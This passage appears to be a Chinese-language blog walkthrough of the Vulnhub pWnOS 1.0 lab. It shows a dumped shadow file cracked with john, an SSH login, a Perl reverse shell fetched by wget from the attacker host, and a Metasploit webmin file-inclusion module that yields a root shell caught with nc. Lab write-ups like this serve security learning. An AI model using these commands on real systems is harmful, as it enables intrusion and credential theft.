class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsshd:<span class=\"hljs-operator\">!</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nvmware:$<span class=\"hljs-number\">1</span>$<span class=\"hljs-number\">7</span>nwi9F<span class=\"hljs-operator\">/</span>D$AkdCcO2UfsCOM0IC8BYBb<span class=\"hljs-operator\">/</span>:<span class=\"hljs-number\">14042</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nobama:$<span class=\"hljs-number\">1</span>$hvDHcCfx$pj78hUduionhij9q9JrtA0:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nosama:$<span class=\"hljs-number\">1</span>$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nyomama:$<span class=\"hljs-number\">1</span>$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n</li>\n<li>\n<p>尝试使用<code>john</code>破解带有<code>shell</code>的用户</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.</span>txt\nroot:$<span class=\"hljs-number\">1</span>$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm<span class=\"hljs-operator\">/</span>:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nvmware:$<span class=\"hljs-number\">1</span>$<span class=\"hljs-number\">7</span>nwi9F<span class=\"hljs-operator\">/</span>D$AkdCcO2UfsCOM0IC8BYBb<span class=\"hljs-operator\">/</span>:<span class=\"hljs-number\">14042</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nobama:$<span class=\"hljs-number\">1</span>$hvDHcCfx$pj78hUduionhij9q9JrtA0:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nosama:$<span class=\"hljs-number\">1</span>$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nyomama:$<span class=\"hljs-number\">1</span>$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<p>使用<code>rockyou</code>字典</p>\n<pre><code class=\"hljs language-sql\">john <span class=\"hljs-comment\">--wordlist=/usr/share/wordlists/rockyou.txt 1.txt </span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\njohn <span class=\"hljs-comment\">--wordlist=/usr/share/wordlists/rockyou.txt 1.txt        </span>\nWarning: detected hash type \"md5crypt\", but the string <span class=\"hljs-keyword\">is</span> also recognized <span class=\"hljs-keyword\">as</span> \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option <span class=\"hljs-keyword\">to</span> force loading these <span class=\"hljs-keyword\">as</span> that type instead\n<span class=\"hljs-keyword\">Using</span> <span class=\"hljs-keyword\">default</span> input encoding: UTF<span class=\"hljs-number\">-8</span>\nLoaded <span class=\"hljs-number\">5</span> password hashes <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">5</span> different salts (md5crypt, crypt(<span class=\"hljs-number\">3</span>) $<span class=\"hljs-number\">1</span>$ (<span class=\"hljs-keyword\">and</span> variants) [MD5 <span class=\"hljs-number\">256</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">256</span> AVX2 <span class=\"hljs-number\">8</span>x3])\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl<span class=\"hljs-operator\">-</span>C <span class=\"hljs-keyword\">to</span> abort, almost <span class=\"hljs-keyword\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nh4ckm3           (vmware)     \n<span class=\"hljs-number\">1</span>g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">19</span> DONE (<span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-25</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">49</span>) <span class=\"hljs-number\">0.002002</span>g<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">28228</span>p<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">128126</span>c<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">128126</span>C<span class=\"hljs-operator\">/</span>s <span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-number\">0</span>mc3t..<span class=\"hljs-operator\">*</span><span class=\"hljs-number\">7</span>¡Vamos<span class=\"hljs-operator\">!</span>\nUse the \"--show\" option <span class=\"hljs-keyword\">to</span> display <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">of</span> the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>破解出了用户<code>vmware</code> 的密码 <code>h4ckm3</code></p>\n</li>\n</ol>\n<h2>获得shell并提权</h2>\n<ol>\n<li>\n<p>使用ssh登录破解出来的用户，获得shell</p>\n<pre><code class=\"hljs language-sql\">ssh <span class=\"hljs-operator\">-</span>oHostKeyAlgorithms<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">+</span>ssh<span class=\"hljs-operator\">-</span>dss vmware<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>\nThe authenticity <span class=\"hljs-keyword\">of</span> host <span class=\"hljs-string\">'192.168.75.152 (192.168.75.152)'</span> can<span class=\"hljs-string\">'t be established.\nDSA key fingerprint is SHA256:r69naj+dUdsNI77F8/FCC9zwpVPk1rzzEdT5znXT/Lo.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span><span class=\"hljs-string\">' (DSA) to the list of known hosts.\nvmware@192.168.75.152'</span>s password: \nLinux ubuntuvm <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.22</span><span class=\"hljs-number\">-14</span><span class=\"hljs-operator\">-</span>server #<span class=\"hljs-number\">1</span> SMP Sun Oct <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">23</span> GMT <span class=\"hljs-number\">2007</span> i686\n\nThe programs included <span class=\"hljs-keyword\">with</span> the Ubuntu <span class=\"hljs-keyword\">system</span> <span class=\"hljs-keyword\">are</span> <span class=\"hljs-keyword\">free</span> software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">each</span> program <span class=\"hljs-keyword\">are</span> described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>share<span class=\"hljs-operator\">/</span>doc<span class=\"hljs-comment\">/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\nLast login: Fri Jun 20 14:35:37 2008\nvmware@ubuntuvm:~$ \n</span></code></pre>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">vmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ uname <span class=\"hljs-operator\">-</span>a\nLinux ubuntuvm <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.22</span><span class=\"hljs-number\">-14</span><span class=\"hljs-operator\">-</span>server #<span class=\"hljs-number\">1</span> SMP Sun Oct <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">23</span> GMT <span class=\"hljs-number\">2007</span> i686 GNU<span class=\"hljs-operator\">/</span>Linux\nvmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ id\nuid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1000</span>(vmware) gid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1000</span>(vmware) <span class=\"hljs-keyword\">groups</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">4</span>(adm),<span class=\"hljs-number\">20</span>(dialout),<span class=\"hljs-number\">24</span>(cdrom),<span class=\"hljs-number\">25</span>(floppy),<span class=\"hljs-number\">29</span>(audio),<span class=\"hljs-number\">30</span>(dip),<span class=\"hljs-number\">44</span>(video),<span class=\"hljs-number\">46</span>(plugdev),<span class=\"hljs-number\">104</span>(scanner),<span class=\"hljs-number\">111</span>(lpadmin),<span class=\"hljs-number\">112</span>(admin),<span class=\"hljs-number\">1000</span>(vmware)\nvmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ sudo <span class=\"hljs-operator\">-</span>l\n[sudo] password <span class=\"hljs-keyword\">for</span> vmware:\nSorry, <span class=\"hljs-keyword\">user</span> vmware may <span class=\"hljs-keyword\">not</span> run sudo <span class=\"hljs-keyword\">on</span> ubuntuvm.\n</code></pre>\n</li>\n<li>\n<p>提权</p>\n<ul>\n<li>\n<p>发现<code>cron.d</code>里面有个root权限运行的自动化任务，但是不支持写入</p>\n</li>\n<li>\n<p>没找到什么可以提权的点，查看wp，发现<code>webmin</code>文件夹带有root权限</p>\n<pre><code class=\"hljs language-sql\">vmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">/</span>var$ ls <span class=\"hljs-operator\">-</span>al <span class=\"hljs-operator\">|</span> grep <span class=\"hljs-string\">'webmin'</span>\ndrwx<span class=\"hljs-comment\">------  2 root bin   4096 2008-06-10 13:31 webmin</span>\n</code></pre>\n<p>因为我们之前获取的<code>shadow</code>文件是要<code>root</code>权限才能获取的，利用的是<code>webmin</code>本文件包含漏洞，所以我们可以把反弹<code>shell</code>文件放到靶机然后利用漏洞包含<code>shell</code> 文件</p>\n</li>\n<li>\n<p>因为<code>webmin</code>是通过<code>perl</code>写的，所以需要使用<code>cgi</code>后缀的文件(<code>perl</code>环境下的可执行文件)</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>share<span class=\"hljs-operator\">/</span>webshells<span class=\"hljs-operator\">/</span> 是kali中一个常见的路径，用于存放 web shell 文件。这些文件通常是用于测试或攻击的脚本\ncp <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>share<span class=\"hljs-operator\">/</span>webshells<span class=\"hljs-operator\">/</span>perl<span class=\"hljs-operator\">/</span>perl<span class=\"hljs-operator\">-</span>reverse<span class=\"hljs-operator\">-</span>shell.pl perl<span class=\"hljs-operator\">-</span>reverse<span class=\"hljs-operator\">-</span>shell.cgi \n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 开启web服务方便主机下载\nphp <span class=\"hljs-operator\">-</span>S <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">80</span>\n</code></pre>\n</li>\n<li>\n<p>靶机下载shell文件，存放在家目录</p>\n<pre><code class=\"hljs language-sql\">vmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ wget http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span><span class=\"hljs-operator\">/</span>perl<span class=\"hljs-operator\">-</span>reverse<span class=\"hljs-operator\">-</span>shell.cgi\n<span class=\"hljs-comment\">--02:20:10--  http://192.168.75.151/perl-reverse-shell.cgi</span>\n           <span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">></span> `perl<span class=\"hljs-operator\">-</span>reverse<span class=\"hljs-operator\">-</span>shell.cgi<span class=\"hljs-string\">'\nConnecting to 192.168.75.151:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3,712 (3.6K)\n\n100%[===========================================================================>] 3,712         --.--K/s             \n\n02:20:10 (189.12 MB/s) - `perl-reverse-shell.cgi'</span> saved [<span class=\"hljs-number\">3712</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">3712</span>]\n\nvmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ mv perl<span class=\"hljs-operator\">-</span>reverse<span class=\"hljs-operator\">-</span>shell.cgi shell.cgi <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 重命名\nvmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ chmod <span class=\"hljs-operator\">+</span>x shell.cgi  <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 添加可执行权限\nvmware<span class=\"hljs-variable\">@ubuntuvm</span>:<span class=\"hljs-operator\">~</span>$ ls <span class=\"hljs-operator\">-</span>al <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>查看权限\n</code></pre>\n</li>\n<li>\n<p>修改<code>shell.cgi</code>文件参数</p>\n<pre><code class=\"hljs language-sql\">     <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> vim shell.cgi\n     <span class=\"hljs-number\">45</span> my $ip <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">'192.168.75.151'</span>; <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>kali 的 ip\n     <span class=\"hljs-number\">46</span> my $port <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">1234</span>; <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 端口\n</code></pre>\n</li>\n<li>\n<p>回到kali，运行<code>msf</code>，使用<code>webmin</code>的文件包含漏洞，将<code>path</code>改为<code>/home/vwware/shell.cgi</code></p>\n<p>同时开始监听1234端口，等待反弹shell</p>\n<pre><code class=\"hljs language-sql\">nc <span class=\"hljs-operator\">-</span>lvp <span class=\"hljs-number\">1234</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nlistening <span class=\"hljs-keyword\">on</span> [<span class=\"hljs-keyword\">any</span>] <span class=\"hljs-number\">1234</span> ...\n</code></pre>\n<p>运行<code>msf</code>，并利用<code>webmin</code>的本地文件包含漏洞包含<code>shell.cgi</code></p>\n<pre><code class=\"hljs language-sql\">msf6 <span class=\"hljs-operator\">></span> use auxiliary<span class=\"hljs-operator\">/</span>admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure \nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">show</span> options\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span> <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 靶机ip\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rpath <span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>vmware<span class=\"hljs-operator\">/</span>shell.cgi <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>shell.cgi的路径\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> exploit\n</code></pre>\n<p><code>exploit</code>完毕后<code>nc</code>已经连接到<code>root</code>账户了</p>\n<pre><code class=\"hljs language-sql\">nc <span class=\"hljs-operator\">-</span>lvp <span class=\"hljs-number\">1234</span>\nlistening <span class=\"hljs-keyword\">on</span> [<span class=\"hljs-keyword\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>: inverse host lookup failed: <span class=\"hljs-literal\">Unknown</span> host\n<span class=\"hljs-keyword\">connect</span> <span class=\"hljs-keyword\">to</span> [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (<span class=\"hljs-literal\">UNKNOWN</span>) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>] <span class=\"hljs-number\">52459</span>\n <span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">10</span> up  <span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">02</span>,  <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">user</span>,  load average: <span class=\"hljs-number\">0.00</span>, <span class=\"hljs-number\">0.00</span>, <span class=\"hljs-number\">0.00</span>\n<span class=\"hljs-keyword\">USER</span>     TTY      <span class=\"hljs-keyword\">FROM</span>              LOGIN@   IDLE   JCPU   PCPU WHAT\nvmware   pts<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>   <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">53</span>   <span class=\"hljs-number\">22.00</span>s  <span class=\"hljs-number\">0.14</span>s  <span class=\"hljs-number\">0.14</span>s <span class=\"hljs-operator\">-</span>bash\nLinux ubuntuvm <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.22</span><span class=\"hljs-number\">-14</span><span class=\"hljs-operator\">-</span>server #<span class=\"hljs-number\">1</span> SMP Sun Oct <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">23</span> GMT <span class=\"hljs-number\">2007</span> i686 GNU<span class=\"hljs-operator\">/</span>Linux\nuid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span>(root) gid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span>(root)\n<span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>apache: can<span class=\"hljs-string\">'t access tty; job control turned off\n</span></code></pre>\n<pre><code class=\"hljs language-sql\"># whoami\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nroot\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>思路</h2>\n<p>通过CMS自带的本地文件包含漏洞，因为能包含shadow文件，所以带有root权限，所以获得初级shell时上传反弹shell脚本到靶机目录，然后通过靶机本地文件包含漏洞包含shell脚本即可反弹shell</p>","title":"Vulnhub - pWnOS 1 0","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"pWnOS: 1.0\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，`152`为靶机\n    \n    \n    \n2. 扫描主机所有端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n    扫描出`miniserv`迷你服务器搭建的`webmin`，并且扫出它的任意文件读取漏洞`cve2006-33..."},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true}